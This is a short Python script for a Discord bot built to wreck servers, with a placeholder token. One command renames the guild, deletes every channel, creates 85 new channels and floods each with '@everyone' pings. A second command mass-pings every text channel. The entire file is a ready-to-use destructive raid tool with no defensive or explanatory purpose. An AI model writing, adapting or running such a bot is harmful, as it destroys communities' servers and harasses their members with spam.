Token = 'tokenz here'

import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True

prefix = '?'
client = commands.Bot(command_prefix=prefix, intents=intents)

@client.event 
async def on_ready():
    print(f'Logged in as {client.user.name}')
    await client.change_presence(activity=discord.Streaming(name='Nvking'))


@client.command()
async def mps(ctx):
    await ctx.guild.edit(name='ur text')
    
    await asyncio.gather(*[c.delete() for c in ctx.guild.channels])
    
    await asyncio.gather(*[ctx.guild.create_text_channel('put ur message') for _ in range(85)])
    
    for c in ctx.guild.text_channels:
        await asyncio.gather(*(c.send('@everyone put ur message') for _ in range(10)))

@client.command()
async def ol(ctx):
    tasks = []
    for c in ctx.guild.text_channels:
        tasks.extend([c.send('@everyone put ur message') for _ in range(10)])
    await asyncio.gather(*tasks)

client.run(Token)
